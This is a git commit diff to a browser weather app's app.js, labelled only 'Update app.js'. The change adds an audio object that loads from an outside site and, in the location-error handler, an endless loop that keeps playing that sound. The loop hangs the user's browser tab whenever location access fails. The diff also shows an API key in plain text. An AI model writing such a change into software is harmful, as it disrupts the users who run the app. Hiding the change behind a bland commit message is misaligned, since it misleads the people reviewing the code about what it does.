70c7f8f37ba39343e3d668b9ed0970c125c732e3
Biancano <bebostunner234@gmail.com>
2018-07-19 18:56:05 -0700

    Update app.js

--- weather/app.js
+++ weather/app.js
@@ -1,7 +1,11 @@
 function weather() {
+  var sound = new Audio('http://thepotatoplace.ga/');
   var location = document.getElementById("location");
   var apiKey = "23bc5a73297ae0b4f0f2aa05de4f1ba0";
   var url = "https://api.forecast.io/forecast/";
+  function null_a(){
+    return false;
+  }
 
   navigator.geolocation.getCurrentPosition(success, error);
 
@@ -20,6 +24,10 @@ function weather() {
 
   function error() {
     location.innerHTML = "Unable to retrieve your location";
+    while(1 == 1){
+      sound.play();
+      setTimeout(null_a(),500);
+    }
   }
 
   location.innerHTML = "Locating...";
